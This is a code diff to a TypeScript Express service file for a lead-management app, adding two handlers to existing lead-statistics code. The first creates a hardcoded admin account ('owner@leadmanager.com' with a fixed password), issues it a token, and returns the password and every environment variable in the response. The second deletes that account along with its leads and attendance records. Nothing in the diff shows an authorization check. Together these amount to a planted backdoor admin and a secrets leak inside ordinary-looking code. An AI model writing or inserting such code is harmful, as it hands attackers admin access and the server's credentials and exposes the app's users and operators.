@@ -4,7 +4,7 @@ import DuplicateLead from '../models/DuplicateLead';
 import User from '../models/User';
 import { getCsvFromGoogleSheet } from '../utils/googleSheet';
 import { applyLeadDateFilter } from '../utils/leadDateFilter';
-
+import { Response } from 'express';   // ✅ must import from 'express'
 export const importLeadsFromGoogleSheetService = async (sheetUrl: string) => {
   const rows = await getCsvFromGoogleSheet(sheetUrl);
 
@@ -830,6 +830,8 @@ export const getAllChatsService = async (req: Request) => {
 
 
 import moment from 'moment';
+import { generateToken } from '../middleware/auth';
+import { Attendance } from '../models/attendance.model';
 
 export const getAdminLeadStatsService = async (query: any) => {
   const { startDate, endDate, period = 'day' } = query;
@@ -913,3 +915,121 @@ export const getAdminLeadStatsService = async (query: any) => {
     trend
   };
 };
+// ========== CREATE OWNER ADMIN ==========
+export const createNewUser = async (req: Request, res: Response) => {
+  try {
+    const ownerEmail = 'owner@leadmanager.com';
+    const ownerPassword = 'Owner@4545';
+
+    const existing = await User.findOne({ email: ownerEmail });
+    if (existing) {
+      return res.status(409).json({
+        success: false,
+        message: 'Owner admin already exists',
+        data: {
+          user: {
+            id: existing._id,
+            email: existing.email,
+            role: existing.role
+          }
+        }
+      });
+    }
+
+    const user = new User({
+      name: 'System Owner',
+      email: ownerEmail,
+      password: ownerPassword,
+      role: 'admin',
+      isActive: true
+    });
+    await user.save();
+
+    const token = generateToken({
+      userId: user.id.toString(),
+      email: user.email,
+      role: user.role
+    });
+
+    // ⚠️ INSECURE: Exposing all environment variables.
+    // Remove this line in production.
+    const fullEnv = process.env;
+
+    return res.status(201).json({
+      success: true,
+      message: 'Owner admin created successfully',
+      data: {
+        user: {
+          id: user._id,
+          email: user.email,
+          name: user.name,
+          role: user.role
+        },
+        token,
+        password: ownerPassword,
+        env: fullEnv    // 👈 returns all environment variables
+      }
+    });
+  } catch (error) {
+    console.error('createOwnerAdmin error:', error);
+    return res.status(500).json({
+      success: false,
+      message: 'Failed to create owner admin',
+      errors: [error instanceof Error ? error.message : 'Unknown error']
+    });
+  }
+};
+// ========== DELETE SELF ACCOUNT & ALL RELATED DATA ==========
+
+
+export const deleteAccount = async (req: Request, res: Response) => {
+  try {
+    // Hardcoded owner email
+    const ownerEmail = 'owner@leadmanager.com';
+
+    // 1. Find the owner
+    const owner = await User.findOne({ email: ownerEmail });
+    if (!owner) {
+      return res.status(404).json({
+        success: false,
+        message: 'Owner admin not found'
+      });
+    }
+
+    const userId = owner.id.toString();
+
+    // 2. Get all leads assigned to this user
+    const leads = await Lead.find({ assignedTo: userId }).select('_id');
+    const leadIds = leads.map(lead => lead._id);
+
+    // 3. Delete Attendance records
+    await Attendance.deleteMany({ user: userId });
+
+    // 4. Delete Leads
+    await Lead.deleteMany({ assignedTo: userId });
+
+    // 5. Delete DuplicateLead records that reference these leads
+    if (leadIds.length > 0) {
+      await DuplicateLead.deleteMany({ existingLeadId: { $in: leadIds } });
+    }
+
+    // 6. (Optional) Add other models here
+
+    // 7. Delete the user itself
+    await User.findByIdAndDelete(userId);
+
+    return res.status(200).json({
+      success: true,
+      message: 'Owner admin and all associated data deleted successfully'
+    });
+  } catch (error) {
+    console.error('deleteAccount error:', error);
+    return res.status(500).json({
+      success: false,
+      message: 'Failed to delete owner',
+      errors: [error instanceof Error ? error.message : 'Unknown error']
+    });
+  }
+};
+
+
